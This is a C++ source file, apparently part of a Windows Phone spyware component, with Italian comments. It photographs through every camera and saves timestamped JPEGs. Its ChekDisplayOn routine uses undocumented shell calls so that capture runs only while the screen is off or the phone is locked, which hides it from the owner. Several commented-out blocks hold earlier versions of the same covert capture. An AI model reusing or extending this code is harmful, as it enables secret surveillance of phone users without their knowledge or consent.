#include "NativePhotoCaptureInterface.h"
#include "FunctionFunc.h"
#include "Common.h"

using namespace Microsoft::WRL;
using namespace Windows::Foundation;
using namespace Windows::Foundation::Collections;
using namespace Windows::Phone::Media::Capture;
using namespace Windows::Storage;
using namespace Concurrency;
using namespace Platform;



#include <time.h>


#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21

//#define DTTMFMTAUD "%Y%m%d%H%M%Sxxxxxx"
#define DTTMFMTAUD "%Y%m%d%H%M%S"
#define DTTMSZAUD 16

char nomeFile[32];	

static int COSTRUITO=0;

static char *getDtTmAUD (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZAUD, DTTMFMTAUD, localtime (&t));
    return buff;
}

static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

#include <windows.h>
#include <iostream>
#include <fstream>

using namespace std;
using namespace NativePhotoCaptureInterface::Native;


bool ChekDisplayOn()
{
	
	if (_Shell_IsUnlockedNormal()==1) {
		return TRUE;
	} else	{

		//if(_Shell_IdleTimerReset(8) == 0x1000000 ) return FALSE;
		if(_Shell_IdleTimerReset(8) != 0 ) return FALSE;
			else return TRUE;
	}

}


UINT ReaderCallback(int* rgBytes, UINT cb, UINT cbActual)
{
	/*
    cbActual = 0;
    uint num2 = cb;
    try
    {
        while (cbActual < cb)
        {
            int count = (int) Math.Min((uint) this._scratch.Length, num2);
            count = this._s.Read(this._scratch, 0, count);
            Marshal.Copy(this._scratch, 0, IntPtr.Add(rgBytes, (int) cbActual), count);
            num2 -= (uint) count;
            cbActual += count;
            if (count == 0)
            {
                break;
            }
        }
        return 0;
    }
    catch (Exception exception)
    {
        return this.MapExceptions(exception);
    }
	*/
	
	WCHAR msg[128];
	swprintf_s(msg, L"ReaderCallback>>>>>>>>>>>>>>>>> rgBytes=0x%x, cb=0x%x, cbActual=0x%x\n",rgBytes,cb,cbActual);
	OutputDebugString(msg);
	
	  return 0;
}

UINT SeekCallBack(long dlibMove, UINT dwOrigin, ULONG plibNewPosition)
{
	/*
    try
    {
        SeekOrigin origin = (SeekOrigin) dwOrigin;
        plibNewPosition = (ulong) this._s.Seek(dlibMove, origin);
        return 0;
    }
    catch (Exception exception)
    {
        return this.MapExceptions(exception);
    }
	*/
	WCHAR msg[128];
	swprintf_s(msg, L"SeekCallBack>>>>>>>>>>>>>>>>> dlibMove=0x%x, dwOrigin=0x%x, plibNewPosition=0x%x\n",dlibMove,dwOrigin,plibNewPosition);
	OutputDebugString(msg);
	 return 0;

}


UINT WriteCallback(int* rgBytes, UINT cb,  UINT *cbActual)
{
	/*
      cbActual = 0;
    uint num2 = cb;

        while (cbActual < cb)
        {
            int length = (int) Math.Min((uint) this._scratch.Length, num2);
            Marshal.Copy(IntPtr.Add(rgBytes, (int) cbActual), this._scratch, 0, length);
            this._s.Write(this._scratch, 0, length);
            num2 -= (uint) length;
            cbActual += length;
        }
        return 0;
   

		*/
	/*
	cbActual = 0;
    UINT num2 = cb;

        while (cbActual < cb)
        {
            int length = (INT) __min((UINT) 0x400, num2);

            //_RtlCopyMemory(rgBytes+cbActual, 0x400, 0, length);
            //this._s.Write(0x400, 0, length);
            num2 -= (UINT) length;
            cbActual += length;
        }
        return 0;
   */



	WCHAR msg[128];
	swprintf_s(msg, L"WriteCallback>>>>>>>>>>>>>>>>> rgBytes=0x%x, cb=0x%x, cbActual=0x%x\n",rgBytes,cb,cbActual);
	OutputDebugString(msg);
	DBG_TRACE(msg, 1, FALSE);
	
	fstream filestr;
	//non utilizzo l'incremento delle immagini
	//filestr.open("image.rgb", fstream::out|fstream::binary);
	filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
	filestr.seekg (0, ios::beg);
	filestr.write ((const char*)rgBytes, cb);
	filestr.close();

	*cbActual=cb;

	return 0;
}

NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
{
	
		Size captureDimensions;
		captureDimensions.Width = 640;
		captureDimensions.Height = 480;		


		IVectorView<CameraSensorLocation>^ pAvailableSensorLocations=PhotoCaptureDevice::AvailableSensorLocations;
			
			
		//cattura da tutte le camere disponibili
		//devo creare due thread separati, per cui il for pulito non fuo' essere utilizzato
		for(int i=0;i<pAvailableSensorLocations->Size;i++)
		{
			//controlla che non vi sia il display acceso
			//serve sugli htc sui nokia sembrerebbe non servire da gestire in un secondo tempo
			if(ChekDisplayOn()==TRUE) break;

			concurrency::cancellation_token_source PhotoTaskTokenSourceFront;

			task<PhotoCaptureDevice^> AudioTask(PhotoCaptureDevice::OpenAsync(pAvailableSensorLocations->GetAt(i), captureDimensions), PhotoTaskTokenSourceFront.get_token());


			AudioTask.then([=](task<PhotoCaptureDevice^> getPhotoTask)
			{
					auto pPhotoCaptureDevice = getPhotoTask.get();

					Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;

						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;
						//MediaApi_EncodeARGBIntoJpegStream(BUFFER, (uint) 640, (uint) 480, (uint) 640, (uint) 480, (uint) 0, (uint) 90, (uint) ((640 * 4) * 480), this._readercb, this._seekcb, this._writecb, (ulong) ((uint) this._s.Length));

						char nomeFileBase[DTTMSZAUD];				
   						getDtTmAUD(nomeFileBase);
						//0 normalmente è la camera back 1 e' la front
						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
						
						
						sprintf(nomeFile,"photo_%i_%s.jpg",SL,nomeFileBase);

						OutputDebugStringA(nomeFile);
						OutputDebugStringA("\n");

						WCHAR msg[128];
						swprintf_s(msg, L"Assegnato0 nome=%s\n",nomeFile);
						DBG_TRACE(msg, 1, FALSE);

						int ret=_MediaApi_EncodeARGBIntoJpegStream((int*)pixels, 640, 480, 640, 480, 0, 90, ((640 * 4) * 480), NULL, NULL, WriteCallback, 0);

				/*		
						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						//char nomeFile[32];
						//sprintf(nomeFile,"photoF_%s.rgb",nomeFileBase);
						
						*/
						/*
						//0 normalmente è la camera back 1 e' la front
						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
						
						char nomeFile[32];
						sprintf(nomeFile,"photo_%i_%s.rgb",SL,nomeFileBase);

						OutputDebugStringA(nomeFile);
						OutputDebugStringA("\n");

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();
						*/
				
			}
		
	).wait();
			
		}


/***
		IVectorView<CameraSensorLocation>^ pAvailableSensorLocations=PhotoCaptureDevice::AvailableSensorLocations;
			
			
		//cattura da tutte le camere disponibili
		//devo creare due thread separati, per cui il for pulito non fuo' essere utilizzato
		for(int i=0;i<pAvailableSensorLocations->Size;i++)
		{


			IAsyncOperation<PhotoCaptureDevice^> ^openOperation= PhotoCaptureDevice::OpenAsync(pAvailableSensorLocations->GetAt(i), captureDimensions);
			
			openOperation->Completed =  ref new AsyncOperationCompletedHandler<PhotoCaptureDevice^>(
				[=] (IAsyncOperation<PhotoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
				{
					if (status == Windows::Foundation::AsyncStatus::Completed)
					{
						auto pPhotoCaptureDevice = operation->GetResults();
						
						

						Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;
		  
			

						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						//0 normalmente è la camera back 1 e' la front
						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
						
						char nomeFile[32];
						sprintf(nomeFile,"photo_%i_%s.rgb",SL,nomeFileBase);

						OutputDebugStringA(nomeFile);
						OutputDebugStringA("\n");

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();

						//lascio un po' di tempo per la cattura della camera back prima di passare alla front
						_Sleep(2000);
					}
				}
			);
			
		}

***/

/***
			IAsyncOperation<PhotoCaptureDevice^> ^openOperationBack= PhotoCaptureDevice::OpenAsync(Windows::Phone::Media::Capture::CameraSensorLocation::Back, captureDimensions);

			
			openOperationBack->Completed =  ref new AsyncOperationCompletedHandler<PhotoCaptureDevice^>(
				[=] (IAsyncOperation<PhotoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
				{
					if (status == Windows::Foundation::AsyncStatus::Completed)
					{
						auto pPhotoCaptureDevice = operation->GetResults();

						//pPhotoCaptureDevice->FocusAsync();


						//Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;
		  
						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::SceneMode,CameraSceneMode::Macro);
						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FocusIlluminationMode,FocusIlluminationMode::Off);


						//AutoFocusParameters poii;
						//	
						//auto poi=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::LockedAutoFocusParameters)->ToString();
						//	
						//
						//	

						//auto p1=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::ExposureCompensation)->ToString(); /// 0
						//auto p2=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::ExposureTime)->ToString(); //
						//auto p3=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::FlashMode)->ToString(); /// 1 
						//auto p4=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::FlashPower)->ToString(); /// 1

						////0	Indicates that the flash will not be used to focus.
						////1	Indicates that the flash will be used automatically, if needed, to focus.
						//auto p5=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::FocusIlluminationMode)->ToString(); /// H0  N1 
						//auto p6=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::Iso)->ToString(); //
						//auto p7=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::LockedAutoFocusParameters)->ToString(); /// 0
						//auto p8=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::ManualWhiteBalance)->ToString(); //


						//auto p9=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::SceneMode)->ToString(); /// 1  32
						//auto p10=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::WhiteBalancePreset)->ToString(); //

	





						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						char nomeFile[32];
						sprintf(nomeFile,"photoB_%s.rgb",nomeFileBase);

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();

					}
				}
			);
			
***/

/*****
			IAsyncOperation<PhotoCaptureDevice^> ^openOperationFront= PhotoCaptureDevice::OpenAsync(Windows::Phone::Media::Capture::CameraSensorLocation::Front, captureDimensions);

			openOperationFront->Completed =  ref new AsyncOperationCompletedHandler<PhotoCaptureDevice^>(
				[=] (IAsyncOperation<PhotoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
				{
					if (status == Windows::Foundation::AsyncStatus::Completed)
					{
						auto pPhotoCaptureDevice = operation->GetResults();

						Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;
		  


						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						char nomeFile[20];
						sprintf(nomeFile,"photoF%s.rgb",nomeFileBase);

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();

					}
				}
			);



****/


/*****
			concurrency::cancellation_token_source PhotoTaskTokenSourceBack;

			////task<AudioVideoCaptureDevice^> AudioTask(AudioVideoCaptureDevice::OpenForAudioOnlyAsync(), AudioTaskTokenSource.get_token());
			task<PhotoCaptureDevice^> AudioTaskBack(PhotoCaptureDevice::OpenAsync(Windows::Phone::Media::Capture::CameraSensorLocation::Back, captureDimensions), PhotoTaskTokenSourceBack.get_token());


			AudioTaskBack.then([=](task<PhotoCaptureDevice^> getPhotoTask)
			{
					auto pPhotoCaptureDevice = getPhotoTask.get();

					Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;

						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						char nomeFile[32];
						sprintf(nomeFile,"photoB_%s.rgb",nomeFileBase);

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();
				
			}
		
	).wait();
	****/

/****
			concurrency::cancellation_token_source PhotoTaskTokenSourceFront;

			task<PhotoCaptureDevice^> AudioTaskFront(PhotoCaptureDevice::OpenAsync(Windows::Phone::Media::Capture::CameraSensorLocation::Front, captureDimensions), PhotoTaskTokenSourceFront.get_token());


			AudioTaskFront.then([=](task<PhotoCaptureDevice^> getPhotoTask)
			{
					auto pPhotoCaptureDevice = getPhotoTask.get();

					Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;

						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						char nomeFile[32];
						sprintf(nomeFile,"photoF_%s.rgb",nomeFileBase);

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();
				
			}
		
	).wait();

****/







}
